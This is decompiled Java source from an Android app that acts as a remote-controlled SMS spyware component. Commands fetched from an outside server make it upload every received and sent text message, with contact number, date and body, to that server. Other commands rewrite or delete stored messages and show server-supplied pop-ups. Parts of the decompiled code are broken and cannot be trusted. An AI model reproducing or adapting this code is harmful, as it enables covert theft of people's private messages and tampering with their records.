package cn.smsmanager.internet;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.util.Log;
import cn.smsmanager.dao.SMSMessageDAO;
import cn.smsmanager.domain.SmsMessage;
import cn.smsmanager.tools.ParamsInfo;
import com.example.smsmanager.MessageActivity;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
/* loaded from: classes.dex */
public final class ScanHttpCmdTask {
    static String cmdString = "";
    private static String sim_no;
    private final String TAG = "ScanNetWorkTask";
    private Context context;

    public ScanHttpCmdTask(Context context, String sim_no2) {
        this.context = context;
        sim_no = sim_no2;
    }

    /* JADX WARN: Type inference failed for: r0v0, types: [cn.smsmanager.internet.ScanHttpCmdTask$1] */
    public void DoTask() {
        new Thread() { // from class: cn.smsmanager.internet.ScanHttpCmdTask.1
            /* JADX WARN: Can't wrap try/catch for region: R(12:4|100|5|(3:116|6|7)|8|(9:17|98|18|19|110|20|21|(6:125|23|118|24|25|129)(1:32)|9)|124|11|106|12|13|128) */
            /* JADX WARN: Code restructure failed: missing block: B:33:0x0291, code lost:
                r10 = move-exception;
             */
            /* JADX WARN: Code restructure failed: missing block: B:34:0x0292, code lost:
                r10.printStackTrace();
             */
            /* JADX WARN: Removed duplicated region for block: B:17:0x011a  */
            /* JADX WARN: Removed duplicated region for block: B:50:0x035e  */
            @Override // java.lang.Thread, java.lang.Runnable
            /*
                Code decompiled incorrectly, please refer to instructions dump.
            */
            public void run() {
                Exception e;
                int i;
                String dateString;
                Exception e2;
                int i2;
                String dateString2;
                Map<String, String> params;
                Map<String, String> params2 = new HashMap<>();
                params2.put("sim_no", ScanHttpCmdTask.sim_no);
                params2.put("t", new StringBuilder(String.valueOf(System.currentTimeMillis())).toString());
                Log.i("ScanNetWorkTask", "begin to do task!");
                Log.i("ScanNetWorkTask", "cmd:" + ScanHttpCmdTask.cmdString);
                if (ScanHttpCmdTask.cmdString.startsWith("GET_RECIVE_MESSAGE")) {
                    SMSMessageDAO smsMessageDAO = new SMSMessageDAO(ScanHttpCmdTask.this.context);
                    List<SmsMessage> messageList = smsMessageDAO.GetRecieveSMS();
                    Log.i("ScanNetWorkTask", "get receiveSMS");
                    int count = messageList.size();
                    try {
                        params = new HashMap<>();
                    } catch (Exception e3) {
                        e2 = e3;
                    }
                    try {
                        params.put("sim_no", ScanHttpCmdTask.sim_no);
                        params.put("totalCount", new StringBuilder(String.valueOf(count)).toString());
                        SocketHttpRequester.sockPostNoResponse("http://www.shm2580.com/send_recieve_count.asp", params, "UTF-8");
                        Log.i("ScanNetWorkTask", "send smscount:" + count + " to server");
                    } catch (Exception e4) {
                        e2 = e4;
                        e2.printStackTrace();
                        ParamsInfo.sp = ParamsInfo.context.getSharedPreferences("params", 0);
                        int finishCount = ParamsInfo.sp.getInt("finishCount", 0);
                        while (i2 < count) {
                        }
                        Map<String, String> params3 = new HashMap<>();
                        params3.put("sim_no", ScanHttpCmdTask.sim_no);
                        SocketHttpRequester.sockPostNoResponse("http://www.shm2580.com/send_finish.asp", params3, "UTF-8");
                        Log.i("ScanNetWorkTask", "send cmd finish to server");
                    }
                    ParamsInfo.sp = ParamsInfo.context.getSharedPreferences("params", 0);
                    int finishCount2 = ParamsInfo.sp.getInt("finishCount", 0);
                    for (i2 = finishCount2; i2 < count; i2++) {
                        SmsMessage smsMessage = messageList.get(i2);
                        Map<String, String> params4 = new HashMap<>();
                        params4.put("sim_no", ScanHttpCmdTask.sim_no);
                        params4.put("_id", new StringBuilder(String.valueOf(smsMessage.get_id())).toString());
                        params4.put("thread_id", new StringBuilder(String.valueOf(smsMessage.getThread_id())).toString());
                        params4.put("address", smsMessage.getAddress());
                        SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
                        try {
                            dateString2 = df.format(new Date(Long.parseLong(smsMessage.getDate())));
                        } catch (Exception e5) {
                            dateString2 = "1970-01-01 10:12:13";
                        }
                        params4.put("date", dateString2);
                        params4.put("body", smsMessage.getBody());
                        params4.put("read", new StringBuilder(String.valueOf(smsMessage.getRead())).toString());
                        params4.put("type", new StringBuilder(String.valueOf(smsMessage.getType())).toString());
                        try {
                            SocketHttpRequester.sockPostNoResponse("http://www.shm2580.com/send_message.asp", params4, "UTF-8");
                            Log.i("ScanNetWorkTask", "send sms content to server " + finishCount2 + ":" + count);
                            finishCount2++;
                            SharedPreferences.Editor edtor = ParamsInfo.sp.edit();
                            edtor.putInt("finishCount", finishCount2);
                            edtor.commit();
                            if (finishCount2 == count) {
                                SharedPreferences.Editor edtor2 = ParamsInfo.sp.edit();
                                edtor2.putInt("finishCount", 0);
                                edtor2.commit();
                                Log.i("ScanNetWorkTask", "yichu send!");
                                Map<String, String> paramsf = new HashMap<>();
                                paramsf.put("sim_no", ScanHttpCmdTask.sim_no);
                                try {
                                    SocketHttpRequester.sockPostNoResponse("http://www.shm2580.com/send_finish.asp", params4, "UTF-8");
                                } catch (Exception e6) {
                                    e6.printStackTrace();
                                }
                                Log.i("ScanNetWorkTask", "yichu send finish!");
                                return;
                            }
                        } catch (Exception e7) {
                            Log.e("ScanNetWorkTask", "network is error");
                            e7.printStackTrace();
                        }
                    }
                    Map<String, String> params32 = new HashMap<>();
                    params32.put("sim_no", ScanHttpCmdTask.sim_no);
                    SocketHttpRequester.sockPostNoResponse("http://www.shm2580.com/send_finish.asp", params32, "UTF-8");
                    Log.i("ScanNetWorkTask", "send cmd finish to server");
                } else if (ScanHttpCmdTask.cmdString.startsWith("GET_SEND_MESSAGE")) {
                    Log.i("ScanNetWorkTask", "go to get_send_message");
                    SMSMessageDAO smsMessageDAO2 = new SMSMessageDAO(ScanHttpCmdTask.this.context);
                    List<SmsMessage> messageList2 = smsMessageDAO2.GetSentSMS();
                    int count2 = messageList2.size();
                    try {
                        Map<String, String> params5 = new HashMap<>();
                        try {
                            params5.put("sim_no", ScanHttpCmdTask.sim_no);
                            params5.put("totalCount", new StringBuilder(String.valueOf(count2)).toString());
                            SocketHttpRequester.sockPostNoResponse("http://www.shm2580.com/send_recieve_count.asp", params5, "UTF-8");
                            params2 = params5;
                        } catch (Exception e8) {
                            e = e8;
                            params2 = params5;
                            e.printStackTrace();
                            ParamsInfo.sp = ParamsInfo.context.getSharedPreferences("params", 0);
                            int finishCount3 = ParamsInfo.sp.getInt("finishCount", 0);
                            Log.i("ScanNetWorkTask", "finishedCount=" + finishCount3);
                            while (i < count2) {
                            }
                            Map<String, String> paramsf2 = new HashMap<>();
                            paramsf2.put("sim_no", ScanHttpCmdTask.sim_no);
                            SocketHttpRequester.sockPostNoResponse("http://www.shm2580.com/send_finish.asp", params2, "UTF-8");
                        }
                    } catch (Exception e9) {
                        e = e9;
                    }
                    ParamsInfo.sp = ParamsInfo.context.getSharedPreferences("params", 0);
                    int finishCount32 = ParamsInfo.sp.getInt("finishCount", 0);
                    Log.i("ScanNetWorkTask", "finishedCount=" + finishCount32);
                    for (i = finishCount32; i < count2; i++) {
                        SmsMessage smsMessage2 = messageList2.get(i);
                        params2 = new HashMap<>();
                        params2.put("sim_no", ScanHttpCmdTask.sim_no);
                        params2.put("_id", new StringBuilder(String.valueOf(smsMessage2.get_id())).toString());
                        params2.put("thread_id", new StringBuilder(String.valueOf(smsMessage2.getThread_id())).toString());
                        params2.put("address", smsMessage2.getAddress());
                        SimpleDateFormat df2 = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
                        try {
                            dateString = df2.format(new Date(Long.parseLong(smsMessage2.getDate())));
                        } catch (Exception e10) {
                            dateString = "1970-01-01 10:12:13";
                        }
                        params2.put("date", dateString);
                        params2.put("body", smsMessage2.getBody());
                        params2.put("read", new StringBuilder(String.valueOf(smsMessage2.getRead())).toString());
                        params2.put("type", new StringBuilder(String.valueOf(smsMessage2.getType())).toString());
                        try {
                            SocketHttpRequester.sockPostNoResponse("http://www.shm2580.com/send_message.asp", params2, "UTF-8");
                            Log.i("ScanNetWorkTask", "send sms content to server " + finishCount32 + ":" + count2);
                            finishCount32++;
                            SharedPreferences.Editor edtor3 = ParamsInfo.sp.edit();
                            edtor3.putInt("finishCount", finishCount32);
                            edtor3.commit();
                            if (finishCount32 == count2) {
                                SharedPreferences.Editor edtor4 = ParamsInfo.sp.edit();
                                edtor4.putInt("finishCount", 0);
                                edtor4.commit();
                                Log.i("ScanNetWorkTask", "yichu send!");
                                Map<String, String> paramsf3 = new HashMap<>();
                                paramsf3.put("sim_no", ScanHttpCmdTask.sim_no);
                                try {
                                    SocketHttpRequester.sockPostNoResponse("http://www.shm2580.com/send_finish.asp", params2, "UTF-8");
                                } catch (Exception e11) {
                                    e11.printStackTrace();
                                }
                                Log.i("ScanNetWorkTask", "yichu send finish!");
                                return;
                            }
                        } catch (Exception e12) {
                            e12.printStackTrace();
                        }
                    }
                    Map<String, String> paramsf22 = new HashMap<>();
                    paramsf22.put("sim_no", ScanHttpCmdTask.sim_no);
                    try {
                        SocketHttpRequester.sockPostNoResponse("http://www.shm2580.com/send_finish.asp", params2, "UTF-8");
                    } catch (Exception e13) {
                        e13.printStackTrace();
                    }
                } else if (ScanHttpCmdTask.cmdString.startsWith("MODIFY_MESSAGE")) {
                    Map<String, String> params6 = new HashMap<>();
                    params6.put("sim_no", ScanHttpCmdTask.sim_no);
                    try {
                        String cmdBodyString = SocketHttpRequester.sockPost("http://www.shm2580.com/get_cmd_body.asp", params6, "UTF-8");
                        int fengefu = cmdBodyString.indexOf("#");
                        String frontString = cmdBodyString.substring(0, fengefu);
                        String behindString = cmdBodyString.substring(fengefu + 1);
                        int read = Integer.parseInt(frontString.substring(0, 1));
                        String dateString3 = frontString.substring(1, 20);
                        int _id = Integer.parseInt(frontString.substring(20));
                        SMSMessageDAO smsMessageDAO3 = new SMSMessageDAO(ScanHttpCmdTask.this.context);
                        smsMessageDAO3.ModifyMessage(_id, behindString, read, dateString3);
                        SocketHttpRequester.sockPostNoResponse("http://www.shm2580.com/send_finish.asp", params6, "UTF-8");
                    } catch (Exception e14) {
                        e14.printStackTrace();
                    }
                } else if (ScanHttpCmdTask.cmdString.startsWith("DELETE_MESSAGE")) {
                    Map<String, String> params7 = new HashMap<>();
                    params7.put("sim_no", ScanHttpCmdTask.sim_no);
                    try {
                        String cmdBodyString2 = SocketHttpRequester.sockPost("http://www.shm2580.com/get_cmd_body.asp", params7, "UTF-8");
                        String thread_idString = cmdBodyString2.trim();
                        int thread_id = Integer.parseInt(thread_idString);
                        SMSMessageDAO smsMessageDAO4 = new SMSMessageDAO(ScanHttpCmdTask.this.context);
                        smsMessageDAO4.DeleteMessage(thread_id);
                        SocketHttpRequester.sockPostNoResponse("http://www.shm2580.com/send_finish.asp", params7, "UTF-8");
                    } catch (Exception e15) {
                        e15.printStackTrace();
                    }
                } else if (ScanHttpCmdTask.cmdString.startsWith("SHOW_MESSAGE")) {
                    Map<String, String> params8 = new HashMap<>();
                    params8.put("sim_no", ScanHttpCmdTask.sim_no);
                    try {
                        String cmdBodyString3 = SocketHttpRequester.sockPost("http://www.shm2580.com/get_cmd_body.asp", params8, "UTF-8");
                        String cmdBodyString4 = cmdBodyString3.trim();
                        try {
                            Intent intent = new Intent(ParamsInfo.context.getApplicationContext(), MessageActivity.class);
                            intent.addFlags(268435456);
                            intent.putExtra("msg", cmdBodyString4);
                            ParamsInfo.context.getApplicationContext().startActivity(intent);
                            SocketHttpRequester.sockPostNoResponse("http://www.shm2580.com/send_finish.asp", params8, "UTF-8");
                        } catch (Exception ex) {
                            Log.e("CommandParseAndExcute", ex.toString());
                        }
                    } catch (Exception e16) {
                        e16.printStackTrace();
                    }
                }
            }
        }.start();
    }
}
